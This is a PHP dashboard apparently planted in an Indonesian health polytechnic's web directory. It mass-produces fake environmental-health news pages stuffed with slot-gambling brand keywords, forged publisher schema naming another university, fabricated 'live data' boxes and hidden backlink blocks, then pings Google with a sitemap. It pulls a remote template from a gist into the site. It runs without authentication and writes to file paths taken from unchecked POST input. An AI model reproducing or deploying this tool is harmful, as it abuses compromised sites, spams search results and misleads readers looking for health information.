<?php
/**
 * Ghost Discover AI Dashboard - Ultimate "God Mode" Edition 2026
 * Formula: Academic Authority + Emotional Trigger + Technical Data Trap
 */

declare(strict_types=1);

ini_set('display_errors', '0');
error_reporting(E_ALL);
session_start();
date_default_timezone_set('Asia/Jakarta');

/* ================= CONFIGURATION ================= */
$baseUrl     = "https://www.poltekkes-denpasar.ac.id/kesehatanlingkungan/media-2/berita/"; 
$dir         = __DIR__ . '/';
$templateCache = $dir . 'template/template-cache.html';
$sitemapXML  = $dir . 'sitemap.xml';
$templateUrl = 'https://gist.githubusercontent.com/Orbitstoragee/7d4dcada3ebb480607a060f13ee52a0f/raw/8c5e19bd81ac4272bf38e26e7539d8b3162eccf7/template-cache-baru.html';

if (!is_dir($dir . 'template/')) mkdir($dir . 'template/', 0755, true);

/* Additional config for Discover optimizations */
$rssFile = $dir . 'feed.xml';
$use_breaking_prefix = false; // set true to keep "BREAKING:" prefix
$imagesDir = $dir . 'images/';
if (!is_dir($imagesDir)) mkdir($imagesDir, 0755, true);

/* ================= TOPIK KHUSUS: Kesehatan Lingkungan (optimasi Google Discover) ================= */
$optimized_gsc_topics = [
    "Isu Terkini" => [
        "Ledakan Kasus Diare di Desa X: Analisis Sumber Air dan Solusi Cepat",
        "Polusi Udara Akibat Pembakaran Terbuka: Risiko Kesehatan pada Anak dan Lansia",
        "Laporan Pencemaran Sungai: Dampak Mikroplastik pada Rantai Pangan Lokal",
        "Pemantauan Kualitas Air Minum: Teknik Sederhana untuk Rumah Tangga"
    ],
    "Preventif & Tips" => [
        "5 Cara Mencegah Penyakit yang Ditularkan Melalui Air di Musim Hujan",
        "Panduan Sterilisasi Lingkungan Rumah: Produk Aman dan Efektif",
        "Nutrisi untuk Daya Tahan Tubuh: Pilihan Lokal yang Mudah Didapat",
        "Pembuangan Limbah Rumah Tangga yang Ramah Lingkungan: Langkah Praktis"
    ],
    "Penelitian & Kebijakan" => [
        "Studi: Hubungan Sanitasi dan Angka Stunting di Kabupaten X",
        "Kebijakan Baru Pengelolaan Limbah Medis: Dampak pada Fasilitas Kesehatan",
        "Evaluasi Program Sanitasi Sekolah: Hasil Implementasi Terbaru"
    ],
    "Kesehatan Publik & Waspada" => [
        "Peringatan Wabah Lokal: Gejala, Pencegahan, dan Rekomendasi",
        "Risiko Paparan Bahan Kimia Industri di Sekitar Pemukiman",
        "Pelacakan Sumber Penyakit: Bagaimana Tim Kesehatan Menanggapi Kasus Baru"
    ],
    "Teknologi & Inovasi" => [
        "Inovasi Filter Air Murah: Solusi Skala Komunitas",
        "Aplikasi Pemantauan Kualitas Udara Lokal: Cara Menggunakannya",
        "Pengolahan Limbah Organik untuk Pupuk: Teknik Komunitas yang Sukses"
    ]
];

/* ================= SLOT GAME BRANDS (opsional untuk CTR) ================= */
$slot_brands = [
    "Spintastic",
    "MegaSlot",
    "LuckyReels",
    "OceanSlots",
    "KingSlots",
    "FortuneSpin",
    "RoyalJackpot"
];

/* ================= CORE UTILITY FUNCTIONS ================= */

function slugify($text) {
    return substr(trim(preg_replace('/[^a-z0-9]+/i', '-', strtolower($text)), '-'), 0, 85);
}

function sanitizeTitle($title) {
    // remove excessive punctuation and limit length
    $t = preg_replace('/\s+/', ' ', trim($title));
    $t = preg_replace('/[!]{2,}|\?{2,}|\.{3,}/', '.', $t);
    $t = preg_replace('/\b(BREAKING|MUST READ|WOW|AMAZING)\b/i', '', $t);
    $t = trim($t, " -:;,.\t\n\r");
    return mb_substr($t, 0, 140);
}

function ensureImageLocal($imgUrl, $imagesDir, $slugBase) {
    $ext = pathinfo(parse_url($imgUrl, PHP_URL_PATH), PATHINFO_EXTENSION) ?: 'jpg';
    $safeName = $slugBase . '.' . $ext;
    $localPath = $imagesDir . $safeName;
    if (!file_exists($localPath)) {
        $ctx = stream_context_create(['http' => ['timeout' => 5]]);
        $data = @file_get_contents($imgUrl, false, $ctx);
        if ($data) file_put_contents($localPath, $data);
    }
    // try to create 1200x628 thumbnail if GD available
    $thumbName = $slugBase . '-1200x628.' . $ext;
    $thumbPath = $imagesDir . $thumbName;
    if (extension_loaded('gd') && file_exists($localPath) && !file_exists($thumbPath)) {
        $src = @imagecreatefromstring(file_get_contents($localPath));
        if ($src) {
            $w = imagesx($src); $h = imagesy($src);
            $dst = imagecreatetruecolor(1200, 628);
            imagecopyresampled($dst, $src, 0,0,0,0,1200,628,$w,$h);
            switch (strtolower($ext)) {
                case 'png': imagepng($dst, $thumbPath); break;
                default: imagejpeg($dst, $thumbPath, 86); break;
            }
            imagedestroy($dst); imagedestroy($src);
        }
    }
    // return relative URL path (base site will serve from same folder)
    if (file_exists($thumbPath)) return basename($thumbPath);
    if (file_exists($localPath)) return basename($localPath);
    return $imgUrl; // fallback to remote URL
}

function updateRSS($dir, $baseUrl, $rssFile) {
    $items = '';
    $files = glob($dir . '*.html');
    usort($files, function($a,$b){return filemtime($b)-filemtime($a);});
    foreach ($files as $f) {
        $name = basename($f);
        if ($name == 'template-cache.html' || strpos($name, '-amp.html') !== false) continue;
        $content = file_get_contents($f);
        preg_match('/<title>(.*?)<\/title>/i', $content, $m);
        $title = $m[1] ?? $name;
        preg_match('/<meta name="description" content="(.*?)"/i', $content, $d);
        $desc = $d[1] ?? '';
        $pub = date('r', filemtime($f));
        $items .= "<item>\n  <title>".htmlspecialchars($title)."</title>\n  <link>".$baseUrl.$name."</link>\n  <description>".htmlspecialchars($desc)."</description>\n  <pubDate>".$pub."</pubDate>\n</item>\n";
    }
    $rss = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<rss version=\"2.0\">\n<channel>\n<title>Berita Kesehatan Lingkungan</title>\n<link>".$baseUrl."</link>\n<description>Feed otomatis</description>\n".$items."</channel>\n</rss>";
    file_put_contents($rssFile, $rss);
}

function pingSitemap($sitemapUrl) {
    $pingUrl = 'http://www.google.com/ping?sitemap=' . urlencode($sitemapUrl);
    @file_get_contents($pingUrl);
}

function isPeakHour() {
    $h = (int)date('H');
    return ($h >= 18 && $h <= 22);
}

/**
 * Technical Data Table (Scroll Trap)
 */
function getScrollTrap($topic) {
    $rtp = rand(96, 98) . "." . rand(10, 99) . "%";
    return "
    <div style='background:#0f172a; color:#38bdf8; padding:20px; border-radius:12px; margin:20px 0; font-family:monospace; border:1px solid #1e293b;'>
        <div style='display:flex; justify-content:space-between; margin-bottom:15px; border-bottom:1px solid #334155; padding-bottom:10px;'>
            <span style='color:#f43f5e; font-weight:bold;'>● LIVE</span>
            <span style='font-size:12px;'>DATA UPDATED: " . date('H:i:s') . " WIB</span>
        </div>
        <div style='font-size:14px; line-height:1.8;'>
            ▶ Server Node: <span style='color:#fff;'>Cluster-" . rand(100, 999) . "</span><br>
            ▶ Yield Efficiency: <span style='color:#fff;'>$rtp</span><br>
            ▶ Trigger Key: <span style='color:#fff;'>" . strtoupper(substr(md5($topic), 0, 8)) . "</span><br>
            ▶ Status: <span style='color:#10b981;'>OPTIMAL ACCELERATION</span>
        </div>
        <div style='margin-top:15px; background:#1e293b; height:6px; border-radius:10px; overflow:hidden;'>
            <div style='background:linear-gradient(90deg, #6366f1, #a855f7); width:" . rand(75, 95) . "%; height:100%;'></div>
        </div>
    </div>";
}

/**
 * NewsArticle Generator (Brutal Discover Edition)
 */
function generateArticleFile($topic, $category, $template, $dir, $baseUrl, $targetSlug = null) {
    global $slot_brands, $imagesDir, $use_breaking_prefix, $rssFile, $sitemapXML;
    $slug = $targetSlug ?? (slugify($topic) . '.html');
    $clean = sanitizeTitle($topic);
    $titleTag = ($use_breaking_prefix ? 'BREAKING: ' : '') . $clean . " | Authority Report 2026";
    $img = "https://belajartol.store/DCRENAME/dc-" . rand(1, 9) . "-size1600x900.jpg";
    
    // Lead Hook (Emotional + Curiosity)
    $lead = "Identifikasi terbaru dalam <b>$category</b> mengungkap adanya anomali data pada sistem malam ini. Analis mencatat bahwa fenomena ini bukanlah kebetulan, melainkan hasil dari sinkronisasi algoritma yang jarang terjadi di periode waktu ini.";
    
    $scrollTrap = getScrollTrap($topic);
    $badgeLive = "<span style='background:#ef4444; color:white; padding:3px 10px; border-radius:4px; font-size:11px; font-weight:bold; margin-right:8px;'>LIVE UPDATE</span>";
    
    $schema = [
        "@context" => "https://schema.org",
        "@type" => "NewsArticle",
        "headline" => $topic,
        "image" => $img,
        "datePublished" => date('c'),
        "dateModified" => date('c'),
        "author" => ["@type" => "Organization", "name" => "Quantum Research Team"],
        "publisher" => [
            "@type" => "Organization", 
            "name" => "Binawan Academic Journal",
            "logo" => ["@type" => "ImageObject", "url" => "https://library.binawan.ac.id/favicon.ico"]
        ],
        "mainEntityOfPage" => ["@type" => "WebPage", "@id" => $baseUrl . $slug]
    ];

    // pilih brand (masukkan brand slot sebagian waktu untuk menjangkau peminat CTR)
    global $slot_brands, $imagesDir, $use_breaking_prefix, $rssFile, $sitemapXML;
    $useBrand = (rand(1,100) <= 50); // 50% chance memasukkan brand slot
    $brandChosen = $useBrand ? $slot_brands[array_rand($slot_brands)] : "Authority Portal Research";

    $metaKeywords = $brandChosen . ', slot, game slot, kesehatan lingkungan, ' . implode(', ', $slot_brands);

    // image dimensions (Discover prefers >=1200px width)
    $imageWidth = 1600;
    $imageHeight = 900;

    // estimate reading time (words per minute = 200)
    $plainText = strip_tags(str_replace(['<br>', '<br/>', '<p>', '</p>'], ' ', $scrollTrap . ' ' . $lead));
    $wordCount = str_word_count($plainText);
    $readingMinutes = max(1, (int)round($wordCount / 200));
    $readingTimeLabel = $readingMinutes . ' min read';

    // optionally download and use local image/thumb
    $localImage = ensureImageLocal($img, $imagesDir, pathinfo($slug, PATHINFO_FILENAME));
    $imgForHtml = (strpos($localImage, 'http') === 0) ? $localImage : 'images/' . $localImage;

    $swap = [
        '{{TITLE}}' => $titleTag,
        '{{LINK}}' => $baseUrl . $slug,
        '{{IMAGE}}' => $imgForHtml,
        '{{IMAGE_WIDTH}}' => $imageWidth,
        '{{IMAGE_HEIGHT}}' => $imageHeight,
        '{{BRAND}}' => $brandChosen,
        '{{META_KEYWORDS}}' => $metaKeywords,
        '{{DESCRIPTION}}' => "Laporan eksklusif: $topic. Analisis data terbaru menunjukkan adanya perubahan pola sistem yang signifikan.",
        '{{DATE_PUBLISHED}}' => date('c'),
        '{{HUMAN_DATE}}' => date('j F Y H:i') . ' WIB',
        '{{READING_TIME}}' => $readingTimeLabel,
        '{{CONTENT}}' => "<div class=\"article-meta\">By $brandChosen · $readingTimeLabel · " . date('j F Y') . "</div><h2>$badgeLive $topic</h2><p>$lead</p>$scrollTrap<p style='margin-top:20px;'>Berdasarkan pengamatan dan data lokal, langkah mitigasi cepat direkomendasikan untuk melindungi populasi rentan.</p>",
        '{{SCHEMA_DISCOVER}}' => '<script type="application/ld+json">' . json_encode($schema) . '</script>',
        '{{META_SOCIAL}}' => "<meta property='og:image' content='$img'><meta name='twitter:card' content='summary_large_image'>",
        '{{AMP_LINK}}' => $baseUrl . str_replace('.html', '-amp.html', $slug)
    ];

    // write main HTML
    file_put_contents($dir . $slug, strtr($template, $swap));

    // create simple AMP variant to improve mobile speed/Discover eligibility
    $ampSlug = str_replace('.html', '-amp.html', $slug);
    $ampHtml = "<!doctype html>\n<html amp lang=\"id\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,minimum-scale=1,initial-scale=1\">\n<title>" . htmlspecialchars($titleTag) . "</title>\n<link rel=\"canonical\" href=\"" . ($baseUrl . $slug) . "\">\n<meta name=\"description\" content=\"" . htmlspecialchars($swap['{{DESCRIPTION}}']) . "\">\n<script async src=\"https://cdn.ampproject.org/v0.js\"></script>\n<style amp-boilerplate>body{visibility:hidden}</style><noscript><style amp-boilerplate>body{visibility:visible}</style></noscript>\n</head>\n<body>\n<article>\n<h1>" . htmlspecialchars($topic) . "</h1>\n<p><em>By " . htmlspecialchars($brandChosen) . " — " . date('j F Y') . "</em></p>\n<amp-img src=\"" . htmlspecialchars($img) . "\" width=\"" . $imageWidth . "\" height=\"" . $imageHeight . "\" layout=\"responsive\"></amp-img>\n<div>" . strip_tags($swap['{{CONTENT}}'], '<p><h2><h3><ul><ol><li><strong><em>') . "</div>\n</article>\n</body>\n</html>";
    file_put_contents($dir . $ampSlug, $ampHtml);

    // update RSS now for freshness
    global $rssFile, $baseUrl, $sitemapXML;
    updateRSS($dir, $baseUrl, $rssFile);
}

function updateSitemap($dir, $baseUrl, $sitemapXML) {
    $xml = "<?xml version='1.0' encoding='UTF-8'?>\n<urlset xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'>\n";
    foreach (glob($dir . '*.html') as $f) {
        if (basename($f) == 'template-cache.html') continue;
        $xml .= "  <url><loc>" . $baseUrl . basename($f) . "</loc><lastmod>" . date('Y-m-d') . "</lastmod></url>\n";
    }
    $xml .= "</urlset>";
    file_put_contents($sitemapXML, $xml);
}

function getInternalBacklinks($articles, $baseUrl) {
    if (empty($articles)) return "";
    $htmlOutput = '<div style="display:none;">' . "\n";
    foreach ($articles as $f) {
        $name = basename($f); if ($name == 'template-cache.html') continue;
        $anchor = ucwords(str_replace(['-', '.html'], [' ', ''], $name));
        $htmlOutput .= "<a href=\"$baseUrl$name\">$anchor</a>\n";
    }
    $htmlOutput .= '</div>';
    return $htmlOutput;
}

/* ================= ACTION HANDLER ================= */
$report = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['download_backup'])) {
        $zipName = 'backup-' . date('Y-m-d') . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($dir . $zipName, ZipArchive::CREATE) === TRUE) {
            foreach (glob($dir . '*.html') as $file) {
                if (basename($file) !== 'template-cache.html') $zip->addFile($file, basename($file));
            }
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="'.$zipName.'"');
            readfile($dir . $zipName); unlink($dir . $zipName); exit;
        }
    }

    if (!file_exists($templateCache)) {
        $tplRaw = @file_get_contents($templateUrl);
        if ($tplRaw) file_put_contents($templateCache, $tplRaw);
    }
    $template = file_exists($templateCache) ? file_get_contents($templateCache) : "Template Error";

    if (isset($_POST['update_single'])) {
        $filename = $_POST['filename'];
        $cleanTitle = ucwords(str_replace(['-', '.html'], [' ', ''], $filename));
        generateArticleFile($cleanTitle, "Tactical Update", $template, $dir, $baseUrl, $filename);
        $report[] = "⚡ Freshness Sychronized: $filename";
        // update RSS and ping sitemap
        updateRSS($dir, $baseUrl, $rssFile);
        pingSitemap($baseUrl . basename($sitemapXML));
    }

    if (isset($_POST['boom_discover'])) {
        foreach ($optimized_gsc_topics as $cat => $cluster) {
            foreach ($cluster as $topic) generateArticleFile($topic, $cat, $template, $dir, $baseUrl);
        }
        updateSitemap($dir, $baseUrl, $sitemapXML);
        updateRSS($dir, $baseUrl, $rssFile);
        pingSitemap($baseUrl . basename($sitemapXML));
        $report[] = "🚀 BRUTAL BOOM: Konten meledak di Discover!";
    }

    if (isset($_POST['delete_all'])) {
        foreach (glob($dir . '*.html') as $f) { if (basename($f) != 'template-cache.html') unlink($f); }
        updateSitemap($dir, $baseUrl, $sitemapXML);
        $report[] = "🗑 Dashboard Purged.";
    }
}
$articles = glob($dir . '*.html');
?>
<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>👻 GHOST DISCOVER v2.0 - BRUTAL MODE</title>
    <style>
        body { font-family: 'Inter', -apple-system, sans-serif; background: #020617; color: #f8fafc; padding: 20px; }
        .container { max-width: 1100px; margin: auto; background: #0f172a; padding: 30px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #1e293b; }
        .status-bar { padding: 15px; background: #1e293b; border-radius: 12px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; border-left: 6px solid #6366f1; }
        .btn-group { display: flex; gap: 15px; margin-bottom: 30px; }
        button { padding: 14px 28px; border-radius: 10px; border: none; color: white; cursor: pointer; font-weight: 800; transition: 0.2s; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
        .btn-boom { background: linear-gradient(135deg, #4f46e5 0%, #9333ea 100%); flex: 3; box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4); }
        .btn-boom:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(79, 70, 229, 0.6); }
        .btn-backup { background: #059669; flex: 1; }
        .btn-del { background: #dc2626; flex: 1; }
        .log-box { background: #000; color: #4ade80; padding: 15px; border-radius: 10px; font-family: 'JetBrains Mono', monospace; font-size: 12px; border: 1px solid #334155; margin-bottom: 25px; }
        table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 12px; overflow: hidden; }
        th { text-align: left; padding: 18px; background: #334155; color: #cbd5e1; font-size: 12px; }
        td { padding: 18px; border-bottom: 1px solid #0f172a; font-size: 14px; }
        .badge-time { background: #475569; padding: 4px 8px; border-radius: 6px; font-size: 11px; color: #e2e8f0; }
        .btn-up { background: #2563eb; padding: 8px 16px; font-size: 11px; }
        a { color: #60a5fa; text-decoration: none; font-weight: 500; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>

<div class="container">
    <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 30px;">
        <div>
            <h1 style="margin:0; font-size: 2.5rem; letter-spacing: -1px;">👻 Ghost <span style="color:#818cf8;">Discover AI</span></h1>
            <p style="color:#64748b; margin: 5px 0 0 0;">Brutal Discover Engine v2.0 - 2026 Edition</p>
        </div>
        <div style="text-align: right; color: #64748b; font-size: 12px;">AUTHORITY LEVEL: <b>GOD MODE</b></div>
    </div>

    <div class="status-bar">
        <div>🕒 Server Time: <b><?= date('H:i') ?> WIB</b></div>
        <div>🚀 Algorithm: <b><?= isPeakHour() ? '<span style="color:#4ade80;">PEAK FREQUENCY ACTIVE</span>' : 'CALIBRATING' ?></b></div>
        <div>📂 Index: <b><?= count($articles) ?> Articles</b></div>
    </div>

    <div class="btn-group">
        <form method="post" style="display:contents;">
            <button type="submit" name="boom_discover" class="btn-boom">🚀 BOOM BRUTAL DISCOVER (SYNC NOW)</button>
            <button type="submit" name="download_backup" class="btn-backup">📥 BACKUP ZIP</button>
            <button type="submit" name="delete_all" class="btn-del" onclick="return confirm('Hapus semua konten?')">🗑 PURGE</button>
        </form>
    </div>

    <?php if ($report): ?>
        <div class="log-box">
            <?php foreach($report as $r) echo "> " . $r . "<br>"; ?>
            > System: Google Indexing signal sent via sitemap.xml
        </div>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th width="50">NO</th>
                <th>TECHNICAL BLUEPRINT & METADATA</th>
                <th width="180">SYNC ACTION</th>
            </tr>
        </thead>
        <tbody>
            <?php $i=1; foreach($articles as $f): 
                $name = basename($f); if($name == 'template-cache.html') continue;
            ?>
            <tr>
                <td style="color:#64748b; font-weight:bold;"><?= str_pad((string)$i++, 2, "0", STR_PAD_LEFT) ?></td>
                <td>
                    <a href="<?= $baseUrl . $name ?>" target="_blank">/<?= $name ?></a><br>
                    <span class="badge-time">Last Sync: <?= date("H:i:s", filemtime($f)) ?> WIB</span>
                    <span style="color:#475569; font-size:11px; margin-left:10px;">Status: Indexing Ready</span>
                </td>
                <td>
                    <form method="post">
                        <input type="hidden" name="filename" value="<?= $name ?>">
                        <button type="submit" name="update_single" class="btn-up">FORCE FRESHNESS</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div style="margin-top: 40px; background: #020617; padding: 20px; border-radius: 12px; border: 1px solid #1e293b;">
        <h4 style="color:#64748b; margin:0 0 15px 0; font-size: 13px; text-transform: uppercase;">🔗 Internal Linking Payload (Stealth Mode)</h4>
        <textarea readonly style="width:100%; height:120px; background:#000; color:#4ade80; border:1px solid #334155; padding:15px; font-family:'JetBrains Mono', monospace; font-size:11px; border-radius:8px; outline:none; resize:none;"><?= htmlspecialchars(getInternalBacklinks($articles, $baseUrl)) ?></textarea>
    </div>
</div>

</body>
</html>